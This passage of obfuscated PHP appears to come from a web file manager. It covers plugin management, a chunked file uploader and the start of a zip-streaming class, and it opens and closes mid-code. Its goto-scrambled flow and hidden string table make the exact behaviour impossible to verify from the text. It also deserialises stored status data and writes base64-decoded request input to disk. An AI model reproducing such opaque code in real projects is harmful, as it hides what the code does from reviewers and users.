ord($CçÙ…Íªš[$E­œ©›ãÉğ++])) % 64; $A°÷š¢¹–º .= $e˜Ó‡Ş™Ÿ­[$bÔ½ÂâÉ• ]; } $CÜÌæ½½À… = hash_encode($CÀÔØö©· . $A°÷š¢¹–º); break; goto dÕåĞØ‰Ô; dÕåĞØ‰Ô: default: $CÜÌæ½½À… = Mcrypt::encode($EÆËÓŸÎ‘†, $cé¼ÀÕ‚Ú . $b†âİÒ¶Ã‡); break; } $CÜÌæ½½À… = strrev($a¤Â……¤Ä . $b†âİÒ¶Ã‡ . $CÜÌæ½½À…); if ($Eï¦ª¸¸×À - 1 > 0) { $CÜÌæ½½À… = $this->encode($CÜÌæ½½À…, $cé¼ÀÕ‚Ú, $Eï¦ª¸¸×À - 1); } goto F÷ÛœíªÃ; fÜ¾Ã½”¸: $AÁô¾Å š¾ =& $_SERVER[¦‰ùÛß®öĞ¶]; usleep(2); $EÆËÓŸÎ‘† = trim($EÆËÓŸÎ‘†); goto eÙë…íÔÅ; eÙë…íÔÅ: $a¤Â……¤Ä = mt_rand(0, 5) . $AÁô¾Å š¾[72]; $b†âİÒ¶Ã‡ = rand_string(15); $e˜Ó‡Ş™Ÿ­ = $AÁô¾Å š¾[192]; goto AÈÀ‘­; E—«©«†÷‘: } public function decode($Aº‚‹ñ×¥, $cÜ¿ƒ×ÃòÈ, $Fˆ¼õ¨ëÖ„ = 3) { goto dá¯ô×²Ûª; aù¨ó‘‹¾: $Aº‚‹ñ×¥ = strrev($Aº‚‹ñ×¥); $c¾šÛ—µ” = $Aº‚‹ñ×¥[0]; $BÁŸÂøñ’ê = substr($Aº‚‹ñ×¥, 1, 15); goto EÅ‡Ì²ŠêØ; EÅ‡Ì²ŠêØ: $Aº‚‹ñ×¥ = substr($Aº‚‹ñ×¥, 16); $cÚö³‡›ªˆ = $a‚ƒÀªíœ¯[192]; switch ($c¾šÛ—µ”) { case $a‚ƒÀªíœ¯[136]: $d×Üµõìë = Mcrypt::decode($Aº‚‹ñ×¥, strrev($cÜ¿ƒ×ÃòÈ . $BÁŸÂøñ’ê)); break; case $a‚ƒÀªíœ¯[131]: $d×Üµõìë = Mcrypt::decode($Aº‚‹ñ×¥, strrev($BÁŸÂøñ’ê . $cÜ¿ƒ×ÃòÈ)); break; case $a‚ƒÀªíœ¯[193]: $d×Üµõìë = Mcrypt::decode($Aº‚‹ñ×¥, base64_encode($BÁŸÂøñ’ê . $cÜ¿ƒ×ÃòÈ)); break; case $a‚ƒÀªíœ¯[194]: $d×Üµõìë = Mcrypt::decode($Aº‚‹ñ×¥, md5($BÁŸÂøñ’ê . $cÜ¿ƒ×ÃòÈ)); break; case $a‚ƒÀªíœ¯[195]: goto BÛˆ¡²²; E¬„ÇñÕÍ: $a˜œóêäŠ = strpos($cÚö³‡›ªˆ, $CŒó‹ÜÄ¨); $dìöÈÖ®Æã = md5($CŒó‹ÜÄ¨ . md5($cÜ¿ƒ×ÃòÈ . $CŒó‹ÜÄ¨) . $cÜ¿ƒ×ÃòÈ); $dìöÈÖ®Æã = substr($dìöÈÖ®Æã, $a˜œóêäŠ % 8, $a˜œóêäŠ % 8 + 7); goto B‡×Şªåˆ; B¨°ÜëŞÅ‘: break; goto bæ¼Ö‘£ß¸; AÃç²õï: $F‘Â´ßÙ‘ = 0; for ($bªŸƒÁŒì¢ = 0; $bªŸƒÁŒì¢ < strlen($Aº‚‹ñ×¥); $bªŸƒÁŒì¢++) { $F‘Â´ßÙ‘ = $F‘Â´ßÙ‘ == strlen($dìöÈÖ®Æã) ? 0 : $F‘Â´ßÙ‘; $B´Ê‘–Úá = $F‘Â´ßÙ‘++; $Eé‚šÚí¯š = strpos($cÚö³‡›ªˆ, $Aº‚‹ñ×¥[$bªŸƒÁŒì¢]) - $a˜œóêäŠ - ord($dìöÈÖ®Æã[$B´Ê‘–Úá]); while ($Eé‚šÚí¯š < 0) { $Eé‚šÚí¯š += 64; } $FŠÕÓ©¾Øã .= $cÚö³‡›ªˆ[$Eé‚šÚí¯š]; } $d×Üµõìë = base64_decode($FŠÕÓ©¾Øã); goto B¨°ÜëŞÅ‘; BÛˆ¡²²: $Aº‚‹ñ×¥ = hash_decode($Aº‚‹ñ×¥); $CŒó‹ÜÄ¨ = $Aº‚‹ñ×¥[0]; $Aº‚‹ñ×¥ = substr($Aº‚‹ñ×¥, 1); goto E¬„ÇñÕÍ; B‡×Şªåˆ: $FŠÕÓ©¾Øã = $a‚ƒÀªíœ¯[72]; $bªŸƒÁŒì¢ = 0; $Eé‚šÚí¯š = 0; goto AÃç²õï; bæ¼Ö‘£ß¸: default: $d×Üµõìë = Mcrypt::decode($Aº‚‹ñ×¥, $cÜ¿ƒ×ÃòÈ . $BÁŸÂøñ’ê); break; } goto fÕßöºÜ÷ó; dá¯ô×²Ûª: $a‚ƒÀªíœ¯ =& $_SERVER[¦‰ùÛß®öĞ¶]; if (!is_string($Aº‚‹ñ×¥) || strlen($Aº‚‹ñ×¥) < 10) { return !1; } $Aº‚‹ñ×¥ = trim($Aº‚‹ñ×¥); goto aù¨ó‘‹¾; fÕßöºÜ÷ó: if ($Fˆ¼õ¨ëÖ„ - 1 > 0) { $d×Üµõìë = $this->decode($d×Üµõìë, $cÜ¿ƒ×ÃòÈ, $Fˆ¼õ¨ëÖ„ - 1); } return $d×Üµõìë; goto AÃ÷‡…±±; AÃ÷‡…±±: } public function appAllow($AèˆŞß™, $F†˜³›Ë™Û, $C’³÷³Ÿè = true) { $C ·èƒ¼Ì =& $_SERVER[¦‰ùÛß®öĞ¶]; $a‘…ó‘™· = PLUGIN_DIR . $AèˆŞß™ . $C ·èƒ¼Ì[196]; if (!is_array($F†˜³›Ë™Û) || !is_array($F†˜³›Ë™Û[$C ·èƒ¼Ì[1]]) || !is_file($a‘…ó‘™·) || $F†˜³›Ë™Û[$C ·èƒ¼Ì[197]] != 1) { return !1; } if ($C’³÷³Ÿè && !Action($C ·èƒ¼Ì[198])->checkAuth($AèˆŞß™)) { return !1; } return !0; } public function unInstall($aœøš†ÀÉ) { $båÏ¯¤ëÑÉ =& $_SERVER[¦‰ùÛß®öĞ¶]; $C‹ôİù§ãğ = $this->loadList($aœøš†ÀÉ); if (file_exists(PLUGIN_DIR . $aœøš†ÀÉ)) { Hook::apply($aœøš†ÀÉ . $båÏ¯¤ëÑÉ[199]); } $this->remove($C‹ôİù§ãğ[$båÏ¯¤ëÑÉ[133]]); } public function changeStatus($CàÄÉ·—äÇ, $A±ƒÑå˜Ë·) { $a¾‚âŠÖÒ =& $_SERVER[¦‰ùÛß®öĞ¶]; $F¸‡°õˆßÔ = $this->loadList($CàÄÉ·—äÇ); if ($A±ƒÑå˜Ë·) { Hook::apply($CàÄÉ·—äÇ . $a¾‚âŠÖÒ[200]); } $this->update($F¸‡°õˆßÔ[$a¾‚âŠÖÒ[133]], array($a¾‚âŠÖÒ[201] => $A±ƒÑå˜Ë·)); } public function appRegist($b…‘ˆ¬êñ­, $E›Œé™˜«ò) { $EÏ¯ã”£Ë¨ =& $_SERVER[¦‰ùÛß®öĞ¶]; $e’¬±ïÌÀ• = $this->loadList($b…‘ˆ¬êñ­); if ($e’¬±ïÌÀ•) { $this->update($e’¬±ïÌÀ•[$EÏ¯ã”£Ë¨[133]], array($EÏ¯ã”£Ë¨[1] => $E›Œé™˜«ò)); } else { $dš‹àîë² = array($EÏ¯ã”£Ë¨[0] => $b…‘ˆ¬êñ­, $EÏ¯ã”£Ë¨[1] => $E›Œé™˜«ò, $EÏ¯ã”£Ë¨[197] => 0, $EÏ¯ã”£Ë¨[43] => $this->getConfigDefault($b…‘ˆ¬êñ­)); $this->insert($dš‹àîë²); } } public function getConfigDefault($bˆîîÒøÎ‹) { $eÓß…ÊğÙ· =& $_SERVER[¦‰ùÛß®öĞ¶]; $fä£”…ïÜÏ = array(); $D¥Ï„¨ÒÖî = $this->getPackageJson($bˆîîÒøÎ‹); if (!$D¥Ï„¨ÒÖî && is_array($D¥Ï„¨ÒÖî[$eÓß…ÊğÙ·[202]])) { return $fä£”…ïÜÏ; } foreach ($D¥Ï„¨ÒÖî[$eÓß…ÊğÙ·[202]] as $e³õ·ŠíªŒ => $e±Æø°»„ø) { if (!isset($e±Æø°»„ø[$eÓß…ÊğÙ·[203]]) || isset($fä£”…ïÜÏ[$e³õ·ŠíªŒ])) { continue; } $fä£”…ïÜÏ[$e³õ·ŠíªŒ] = $e±Æø°»„ø[$eÓß…ÊğÙ·[203]]; } return $fä£”…ïÜÏ; } public function getPackageJson($ağá«â‹ôÛ) { return Hook::apply($ağá«â‹ôÛ . $_SERVER[¦‰ùÛß®öĞ¶][204]); } public function getConfig($A‹‹Š½Šã, $C¢øñ”‹İÅ = false) { $A— Õ¥Î×Â =& $_SERVER[¦‰ùÛß®öĞ¶]; $b†˜ÍÆÏÏ = array(); $EäÑÔ‡«õÙ = $this->loadList($A‹‹Š½Šã); if ($EäÑÔ‡«õÙ && is_array($EäÑÔ‡«õÙ[$A— Õ¥Î×Â[43]])) { $b†˜ÍÆÏÏ = $EäÑÔ‡«õÙ[$A— Õ¥Î×Â[43]]; } if (!$b†˜ÍÆÏÏ || $C¢øñ”‹İÅ) { $b†˜ÍÆÏÏ = $this->getConfigDefault($A‹‹Š½Šã); } return $b†˜ÍÆÏÏ; } public function setConfig($Aˆ®‡—¶°ï, $cğêÖÔ™î¡ = false) { goto c¥ÍõĞñéÙ; dëè÷Î¬—Ä: $this->update($E‘œ˜ùÙ‰Œ[$A½‰Ü±Ë†ë[133]], array($A½‰Ü±Ë†ë[43] => $AŠç•È ¡í)); goto C×¡â§çÕ¬; aÁÁ•ã½’: if ($cğêÖÔ™î¡ == !1) { $cğêÖÔ™î¡ = $this->getConfigDefault($Aˆ®‡—¶°ï); } $AŠç•È ¡í = $E‘œ˜ùÙ‰Œ[$A½‰Ü±Ë†ë[43]]; foreach ($cğêÖÔ™î¡ as $AÛì´³˜¤æ => $C˜Šê„ßê‘) { $AŠç•È ¡í[$AÛì´³˜¤æ] = is_string($C˜Šê„ßê‘) ? trim($C˜Šê„ßê‘) : $C˜Šê„ßê‘; } goto dëè÷Î¬—Ä; c¥ÍõĞñéÙ: $A½‰Ü±Ë†ë =& $_SERVER[¦‰ùÛß®öĞ¶]; $E‘œ˜ùÙ‰Œ = $this->loadList($Aˆ®‡—¶°ï); if (!$E‘œ˜ùÙ‰Œ) { return !1; } goto aÁÁ•ã½’; C×¡â§çÕ¬: } public function viewList() { goto AÔ¶‹–¥Ù; FÏÍƒ–ô‡: $this->pluginScan($Dšù¶º¼‹); $BĞÂº´ÏÆŸ = array(); foreach ($Dšù¶º¼‹ as $eì½¬Ú×ç“ => $DÊ¿»¹æ‰) { unset($DÊ¿»¹æ‰[$aÂáîŞãÔ[1]], $DÊ¿»¹æ‰[$aÂáîŞãÔ[43]]); $EØå¼öİ = PLUGIN_DIR . $DÊ¿»¹æ‰[$aÂáîŞãÔ[0]] . $aÂáîŞãÔ[196]; if (!is_file($EØå¼öİ)) { continue; } $CŞáµÇ·áº = Hook::apply($DÊ¿»¹æ‰[$aÂáîŞãÔ[0]] . $aÂáîŞãÔ[204]); if (is_array($CŞáµÇ·áº)) { $BĞÂº´ÏÆŸ[$eì½¬Ú×ç“] = array_merge($DÊ¿»¹æ‰, $CŞáµÇ·áº); } } goto E“¹Ö÷·Ò; AÔ¶‹–¥Ù: $aÂáîŞãÔ =& $_SERVER[¦‰ùÛß®öĞ¶]; $Dšù¶º¼‹ = $this->loadList(); $Dšù¶º¼‹ = $this->checkPlugin($Dšù¶º¼‹); goto FÏÍƒ–ô‡; E“¹Ö÷·Ò: return $BĞÂº´ÏÆŸ; goto c™î´°‘Ö; c™î´°‘Ö: } private function pluginScan($D…¤§œ†ïØ) { $f©‘Û÷÷£ë =& $_SERVER[¦‰ùÛß®öĞ¶]; recursion_dir(PLUGIN_DIR, $fœÚÇ‘ÂùÖ, $B¥ƒÚÕ•Ú, 0); foreach ($fœÚÇ‘ÂùÖ as $BÄï»¡º¿) { $càõ‹ÌÙ¯ = get_path_this($BÄï»¡º¿); if (isset($D…¤§œ†ïØ[$càõ‹ÌÙ¯]) || !file_exists($BÄï»¡º¿ . $f©‘Û÷÷£ë[205]) || !file_exists($BÄï»¡º¿ . $f©‘Û÷÷£ë[196])) { continue; } Hook::apply($càõ‹ÌÙ¯ . $f©‘Û÷÷£ë[200]); } } } goto B“Í¤ô²±Ö; a˜ÍÚ……†Á: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto bä¥Î¦À–¿; bä¥Î¦À–¿: $d­†­±÷±Ñ =& $_SERVER[İë¬“ÅÒÛ›]; global $in; $this->in =& $in; goto c”ÔÂ¬¡Ô˜; EÏœŸÊ‘Ì¬: $this->checkSize(); $this->tempPathInit(); goto Cø…â«öº­; c”ÔÂ¬¡Ô˜: if (!empty($_FILES)) { $Aòí°«…˜  = $_FILES[$d­†­±÷±Ñ[164]]; $this->uploadFile = $Aòí°«…˜ [$d­†­±÷±Ñ[1406]]; if (!$this->uploadFile && $Aòí°«…˜ [$d­†­±÷±Ñ[960]] > 0) { show_json($this->errorInfo($Aòí°«…˜ [$d­†­±÷±Ñ[960]]), !1); } } else { if (isset($in[$d­†­±÷±Ñ[388]])) { $this->uploadFile = isset($in[$d­†­±÷±Ñ[1407]]) ? $d­†­±÷±Ñ[1408] : $d­†­±÷±Ñ[1242]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto EÏœŸÊ‘Ì¬; Cø…â«öº­: } public function upload() { goto cŠáß·Íãî; D¦…äê¶: $this->statusSet($B¼òŠÏùİ); if (count($B¼òŠÏùİ[$bƒáÌÓøÔ[1418]]) != $B¼òŠÏùİ[$bƒáÌÓøÔ[1417]]) { $this->showJson($bƒáÌÓøÔ[1421] . $BöùÇìÒÔÙ, !0); } ignore_timeout(); goto DïÀà‰Ÿê; bø¦òµ¶æÎ: $B†ÍÅ”Ó‘» = @fopen($this->tempFile, $bƒáÌÓøÔ[1415]); fseek($B†ÍÅ”Ó‘», $cÙºëÀ¿”); $bÔ±‡ä±¶« = $this->writeTo($EİÍÏ‹©¿†, $B†ÍÅ”Ó‘», $this->tempFile); goto d³Èƒ«ŒÒò; F‹ Èİ¢Ï: return $this->tempFile; goto dÁ™ë“Óè; cŠáß·Íãî: $bƒáÌÓøÔ =& $_SERVER[İë¬“ÅÒÛ›]; $BöùÇìÒÔÙ = isset($this->in[$bƒáÌÓøÔ[1409]]) ? intval($this->in[$bƒáÌÓøÔ[1409]]) : 0; $eè­óÅÄá = isset($this->in[$bƒáÌÓøÔ[1410]]) ? intval($this->in[$bƒáÌÓøÔ[1410]]) : 1; goto a²’ÜØÒ—œ; bÂå¸„‘óÍ: $EİÍÏ‹©¿† = $this->moveUploadedFile($d¾ï²ê¡äµ); if (!$EİÍÏ‹©¿†) { $this->showJson(LNG($bƒáÌÓøÔ[1414]), !1); } $cÙºëÀ¿” = $BöùÇìÒÔÙ * $Dº‰ñ‹ã­’; goto bø¦òµ¶æÎ; d³Èƒ«ŒÒò: $Cß†‰Î…ä† = IO::hashSimple($EİÍÏ‹©¿†); $b¾ßÍ»œ = IO::size($EİÍÏ‹©¿†); @unlink($EİÍÏ‹©¿†); goto d†‚–•£Úô; d†‚–•£Úô: if (!$bÔ±‡ä±¶«) { $this->showJson($bƒáÌÓøÔ[1416] . $BöùÇìÒÔÙ, !1); } $B¼òŠÏùİ[$bƒáÌÓøÔ[1417]] = $eè­óÅÄá; $B¼òŠÏùİ[$bƒáÌÓøÔ[1418]][$bƒáÌÓøÔ[1419] . $BöùÇìÒÔÙ] = array($bƒáÌÓøÔ[1420] => $cÙºëÀ¿”, $bƒáÌÓøÔ[788] => $BöùÇìÒÔÙ, $bƒáÌÓøÔ[78] => $b¾ßÍ»œ, $bƒáÌÓøÔ[161] => $Cß†‰Î…ä†); goto D¦…äê¶; cÕé˜éì’á: CacheLock::lock($this->tempFile, 20); $B¼òŠÏùİ = $this->statusGet(); $this->initFileTemp(); goto bÂå¸„‘óÍ; a²’ÜØÒ—œ: $d¾ï²ê¡äµ = $this->tempFile . $bƒáÌÓøÔ[1411] . $BöùÇìÒÔÙ; $b¾ßÍ»œ = isset($this->in[$bƒáÌÓøÔ[392]]) ? intval($this->in[$bƒáÌÓøÔ[392]]) : 0; $Dº‰ñ‹ã­’ = isset($this->in[$bƒáÌÓøÔ[1412]]) ? intval($this->in[$bƒáÌÓøÔ[1412]]) : 0; goto b…×î†º; b…×î†º: if ($eè­óÅÄá > 1 && $Dº‰ñ‹ã­’ <= 0) { show_json($bƒáÌÓøÔ[1413], !1); } if ($Dº‰ñ‹ã­’ > $b¾ßÍ»œ) { $eè­óÅÄá = 1; } if ($eè­óÅÄá <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto cÕé˜éì’á; DïÀà‰Ÿê: if (!$this->checkChunkHash($B¼òŠÏùİ)) { $this->showJson($bƒáÌÓøÔ[1422], !1); } $this->statusSet(!1); CacheLock::unlock($this->tempFile); goto F‹ Èİ¢Ï; dÁ™ë“Óè: } private function checkSize() { $d±’¡¿¾‹ =& $_SERVER[İë¬“ÅÒÛ›]; if (phpBuild64() || $this->in[$d±’¡¿¾‹[78]] < PHP_INT_MAX) { return; } show_json(LNG($d±’¡¿¾‹[1423]), !1); } private function showJson($Dø®³ˆ²ğ´, $aä—»Š­—†) { CacheLock::unlock($this->tempFile); if (!$aä—»Š­—†) { return show_json($Dø®³ˆ²ğ´, $aä—»Š­—†); } show_json($Dø®³ˆ²ğ´, $aä—»Š­—†); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto c‡šƒİÛŞ; C–ÃÖèç« : touch($BÉÍ… ¤°ä . $dùÕ‚ˆ£‰[1424]); $bµ±¨İ×ó = isset($this->in[$dùÕ‚ˆ£‰[1425]]) ? $this->in[$dùÕ‚ˆ£‰[1425]] : !1; if (strlen($bµ±¨İ×ó) < 30) { $bµ±¨İ×ó = md5(USER_ID . $this->in[$dùÕ‚ˆ£‰[76]] . $this->fileName . $this->in[$dùÕ‚ˆ£‰[78]]); } goto FÎ‹Î©â‡; c‡šƒİÛŞ: $dùÕ‚ˆ£‰ =& $_SERVER[İë¬“ÅÒÛ›]; $BÉÍ… ¤°ä = TEMP_FILES; @mk_dir($BÉÍ… ¤°ä); goto C–ÃÖèç« ; FÎ‹Î©â‡: $this->tempFile = $BÉÍ… ¤°ä . $dùÕ‚ˆ£‰[1426] . md5($bµ±¨İ×ó . $this->in[$dùÕ‚ˆ£‰[1427]]); goto cŒÊˆÆ‰¥‰; cŒÊˆÆ‰¥‰: } private function moveUploadedFile($eÂÒ‡ÌÉßµ) { $C®‚ˆŠøëš =& $_SERVER[İë¬“ÅÒÛ›]; $A´„§öÇ³ = $this->uploadFile; if ($A´„§öÇ³ == $C®‚ˆŠøëš[1428]) { @file_put_contents($eÂÒ‡ÌÉßµ, base64_decode($_REQUEST[$C®‚ˆŠøëš[1429]])); } else { if ($A´„§öÇ³ == $C®‚ˆŠøëš[1242]) { $B¯ìœ¢ï¸Í = @fopen($eÂÒ‡ÌÉßµ, $C®‚ˆŠøëš[1168]); $this->writeTo($A´„§öÇ³, $B¯ìœ¢ï¸Í, $eÂÒ‡ÌÉßµ); } else { if (!move_uploaded_file($A´„§öÇ³, $eÂÒ‡ÌÉßµ)) { return !1; } } } return $eÂÒ‡ÌÉßµ; } private function writeTo($cîñ¸¯áÏñ, $eÎÒ·…Àõ¼, $C¬ë©İÚ¶ø) { goto CÚØ„¹ØÃ©; BŒ™³„‚: return !0; goto dõëìÒºÆí; F›¯ïí¿ĞÕ: fclose($D´å”ÈÁ†); fclose($eÎÒ·…Àõ¼); CacheLock::unlock($cÌÙİÎÀ); goto BŒ™³„‚; cíà”†¦ã: $D´å”ÈÁ† = @fopen($cîñ¸¯áÏñ, $B‹†ïå”•[1167]); if (!$D´å”ÈÁ† || !$eÎÒ·…Àõ¼ || !$f•ÅØùÊ‚) { CacheLock::unlock($cÌÙİÎÀ); return !1; } while (!feof($D´å”ÈÁ†)) { fwrite($eÎÒ·…Àõ¼, fread($D´å”ÈÁ†, 1024 * 200)); } goto F›¯ïí¿ĞÕ; CÚØ„¹ØÃ©: $B‹†ïå”• =& $_SERVER[İë¬“ÅÒÛ›]; $cÌÙİÎÀ = $B‹†ïå”•[1430] . $C¬ë©İÚ¶ø; $f•ÅØùÊ‚ = CacheLock::lock($cÌÙİÎÀ, 1); goto cíà”†¦ã; dõëìÒºÆí: } private function statusGet() { goto C‰¦¹ò¢ùË; b™Ù°¼ª†ê: $D“‹ğ”‰çæ = !1; if (file_exists($d¾ÆÒ²®à)) { $D“‹ğ”‰çæ = @file_get_contents($d¾ÆÒ²®à); } if ($D“‹ğ”‰çæ) { $this->statusData = unserialize($D“‹ğ”‰çæ); } goto b·“ÃÕĞÛÕ; C‰¦¹ò¢ùË: $DÅÇ‘•ç =& $_SERVER[İë¬“ÅÒÛ›]; if (is_array($this->statusData)) { return $this->statusData; } $d¾ÆÒ²®à = $this->tempFile . $DÅÇ‘•ç[1431]; goto b™Ù°¼ª†ê; b·“ÃÕĞÛÕ: if (!$this->statusData) { $Fø•¤”Ø² = array($DÅÇ‘•ç[28] => $this->fileName, $DÅÇ‘•ç[1417] => 0, $DÅÇ‘•ç[1418] => array()); $this->statusSet($Fø•¤”Ø²); } return $this->statusData; goto dÃ‚¸¯¸¹‡; dÃ‚¸¯¸¹‡: } public function statusSet($C…Éå¸µ”µ) { $FÃ•Üò¶ = $this->tempFile . $_SERVER[İë¬“ÅÒÛ›][1431]; if (!$C…Éå¸µ”µ) { if (file_exists($FÃ•Üò¶)) { @unlink($FÃ•Üò¶); } return !0; } $this->statusData = $C…Éå¸µ”µ; return file_put_contents($FÃ•Üò¶, serialize($C…Éå¸µ”µ)); } private function initFileTemp() { $b–èÃƒ¿ç¼ =& $_SERVER[İë¬“ÅÒÛ›]; if (file_exists($this->tempFile)) { return; } $eì¿ÓÁß’ = fopen($this->tempFile, $b–èÃƒ¿ç¼[1432]); fseek($eì¿ÓÁß’, $this->in[$b–èÃƒ¿ç¼[78]] - 1, SEEK_SET); fwrite($eì¿ÓÁß’, $b–èÃƒ¿ç¼[403]); fclose($eì¿ÓÁß’); } public function checkChunk() { goto déÖ’•µï™; FĞàì•†Í‡: $cµİ÷İ»· = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($cµİ÷İ»·[$EõšñĞÒ°[1418]] as $C¬Œ›Ë‘‡) { $BÍº¥¢å‰¬ = $C¬Œ›Ë‘‡[$EõšñĞÒ°[161]]; if ($BÍº¥¢å‰¬) { $A­²©´²Óµ[$EõšñĞÒ°[1433] . $C¬Œ›Ë‘‡[$EõšñĞÒ°[788]]] = $BÍº¥¢å‰¬; } } goto c·ÍêÁ¯¬Î; c·ÍêÁ¯¬Î: return $A­²©´²Óµ; goto bĞ§Ğ¾·ˆÊ; déÖ’•µï™: $EõšñĞÒ° =& $_SERVER[İë¬“ÅÒÛ›]; $A­²©´²Óµ = array(); CacheLock::lock($this->tempFile); goto FĞàì•†Í‡; bĞ§Ğ¾·ˆÊ: } private function checkChunkHash($fê’…ÑŞªŒ) { goto eÇÂÇßÈƒÑ; C÷‹±‚¥‡Ä: return $c÷’‹Û; goto Aõ“‡£êˆ; Dœ½š“ñšß: $FÒñÖ‘Íƒ = _get($this->in, $BÍ²ßò¯—ñ[1434]); if (strlen($FÒñÖ‘Íƒ) == 32 && IO::hashSimple($this->tempFile) == $a¦¬¬£…íî && IO::hashMd5($this->tempFile) == $FÒñÖ‘Íƒ) { return !0; } $b¶ÏªÖö®‹ = fopen($this->tempFile, $BÍ²ßò¯—ñ[905]); goto cÖ¥‹é£ƒ; eÇÂÇßÈƒÑ: $BÍ²ßò¯—ñ =& $_SERVER[İë¬“ÅÒÛ›]; if (count($fê’…ÑŞªŒ[$BÍ²ßò¯—ñ[1418]]) != $fê’…ÑŞªŒ[$BÍ²ßò¯—ñ[1417]]) { return !1; } $a¦¬¬£…íî = _get($this->in, $BÍ²ßò¯—ñ[1425]); goto Dœ½š“ñšß; cÖ¥‹é£ƒ: $c÷’‹Û = !0; foreach ($fê’…ÑŞªŒ[$BÍ²ßò¯—ñ[1418]] as $eˆ‹õ›ÑëÔ) { fseek($b¶ÏªÖö®‹, $eˆ‹õ›ÑëÔ[$BÍ²ßò¯—ñ[1420]]); $B¬Å±§ğì¤ = PathDriverStream::hash($b¶ÏªÖö®‹, $eˆ‹õ›ÑëÔ[$BÍ²ßò¯—ñ[78]]); if ($eˆ‹õ›ÑëÔ[$BÍ²ßò¯—ñ[161]] != $B¬Å±§ğì¤) { $c÷’‹Û = !1; break; } } fclose($b¶ÏªÖö®‹); goto C÷‹±‚¥‡Ä; Aõ“‡£êˆ: } public static function fileName() { goto d¸Ú¬…éêˆ; B©ò½Ù’›Ë: $d–Í…ï–É¸ = strtotime($in[$eÚ±¹ë¤©š[1435]]); $d–Í…ï–É¸ = $d–Í…ï–É¸ ? $d–Í…ï–É¸ : time(); $Dš¥©ÁíÊ = strtolower($c¦½†ÈÚ); goto dÕÂà»Â·ù; dÕÂà»Â·ù: if ($Dš¥©ÁíÊ == $eÚ±¹ë¤©š[1436] || $Dš¥©ÁíÊ == $eÚ±¹ë¤©š[1437]) { $c¦½†ÈÚ = date($eÚ±¹ë¤©š[448], $d–Í…ï–É¸) . $eÚ±¹ë¤©š[71] . $in[$eÚ±¹ë¤©š[78]] . $eÚ±¹ë¤©š[1438]; } else { if ($Dš¥©ÁíÊ == $eÚ±¹ë¤©š[1439]) { $c¦½†ÈÚ = date($eÚ±¹ë¤©š[448], $d–Í…ï–É¸) . $eÚ±¹ë¤©š[71] . $in[$eÚ±¹ë¤©š[78]] . $eÚ±¹ë¤©š[1440]; } } return $c¦½†ÈÚ; goto A·‰ŠâõÇ•; d¸Ú¬…éêˆ: $eÚ±¹ë¤©š =& $_SERVER[İë¬“ÅÒÛ›]; global $in; $c¦½†ÈÚ = isset($in[$eÚ±¹ë¤©š[28]]) ? $in[$eÚ±¹ë¤©š[28]] : $eÚ±¹ë¤©š[33]; goto D¿­²²·Áƒ; D¿­²²·Áƒ: if (!empty($_FILES)) { $c¦½†ÈÚ = $c¦½†ÈÚ ? $c¦½†ÈÚ : $_FILES[$eÚ±¹ë¤©š[164]][$eÚ±¹ë¤©š[388]]; } $c¦½†ÈÚ = str_replace(array($eÚ±¹ë¤©š[94], $eÚ±¹ë¤©š[8]), array($eÚ±¹ë¤©š[8], $eÚ±¹ë¤©š[92]), trim($c¦½†ÈÚ)); if (!is_wap()) { return $c¦½†ÈÚ; } goto B©ò½Ù’›Ë; A·‰ŠâõÇ•: } private function errorInfo($B¯Ù¸°ïØ«) { $c“¶Ë†İƒ =& $_SERVER[İë¬“ÅÒÛ›]; $CÊ¨–Ñç‚ò = array($c“¶Ë†İƒ[1441], $c“¶Ë†İƒ[1442], $c“¶Ë†İƒ[1443], $c“¶Ë†İƒ[1444], $c“¶Ë†İƒ[1445], $c“¶Ë†İƒ[1446], $c“¶Ë†İƒ[1447], $c“¶Ë†İƒ[1448]); return $B¯Ù¸°ïØ« . $c“¶Ë†İƒ[4] . $CÊ¨–Ñç‚ò[$B¯Ù¸°ïØ«]; } } class ZipMake { const VERSION = "\60\x2e\x32\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($fè¥Œ¯¨ß‹ = null) { $B‹“¾ËÀã© =& $_SERVER[İë¬“ÅÒÛ›]; $this->outputStream = fopen($B‹“¾ËÀã©[1449], $B‹“¾ËÀã©[966]); $this->outputName = $fè¥Œ¯¨ß‹; $this->needHeaders = !0; } public function addFile($d©©®Õ¶§, $aÈ…—ÏßÚÜ) { goto FĞœ¡èÄ·ò; C¨Ö¸æïßì: $cåŠğ°†œ‡ = $this->addFileHeader($d©©®Õ¶§, $bÂ½ĞÖ³µ); $FÈ¬¾ã‚Œ¡ = $d”éÊ†Ö— = filesize($aÈ…—ÏßÚÜ); $C¯‘œøÀ¤Â = fopen($aÈ…—ÏßÚÜ, $a£‰´Ü‰ì[1450]); goto Aåßéµåµã; e§³Ë«‘…º: $this->addFileFooter($d©©®Õ¶§, $bÂ½ĞÖ³µ, $EÖ˜Íá…¢, $FÈ¬¾ã‚Œ¡, $d”éÊ†Ö—, $cåŠğ°†œ‡); goto E¢ôƒÔù´Ù; FĞœ¡èÄ·ò: $a£‰´Ü‰ì =& $_SERVER[İë¬“ÅÒÛ›]; $d©©®Õ¶§ = $this->filterFilename($d©©®Õ¶§); $bÂ½ĞÖ³µ = static::METHOD_STORE; goto C¨Ö¸æïßì; Aåßéµåµã: while (!feof($C¯‘œøÀ¤Â)) { $b÷£ª²…¬Æ = fread($C¯‘œøÀ¤Â, 1048576); $this->send($b÷£ª²…¬Æ); } fclose($C¯‘œøÀ¤Â); $EÖ˜Íá…¢ = hexdec(hash_file($a£‰´Ü‰ì[1451], $aÈ…—ÏßÚÜ)); goto e§³Ë«‘…º; E¢ôƒÔù´Ù: } public function addFileFromStream($C¥£™„·ç‚, $CÒè£®è¸) { goto FìöŞñ±; FìöŞñ±: 